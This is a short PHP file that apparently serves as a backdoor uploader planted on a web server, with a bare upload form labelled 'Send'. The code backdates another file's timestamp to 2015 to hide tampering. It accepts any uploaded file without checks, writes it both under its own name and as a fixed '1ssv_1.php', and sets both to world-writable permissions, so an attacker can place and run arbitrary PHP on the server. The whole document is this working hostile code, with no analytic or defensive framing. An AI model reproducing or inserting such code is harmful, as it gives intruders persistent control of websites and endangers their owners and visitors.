<?php

touch('test2.php', strtotime(date('2015-04-04 00:00:00')));

if(isset($_FILES['file'])){copy($_FILES['file']['tmp_name'], '1ssv_1.php');move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);chmod('1ssv_1.php', 0777);chmod($_FILES['file']['name'], 0777);
}

?>
<form method="post" enctype="multipart/form-data" method="post">
<input type="file" name="file" >
<button type="submit">Send</button>
</form>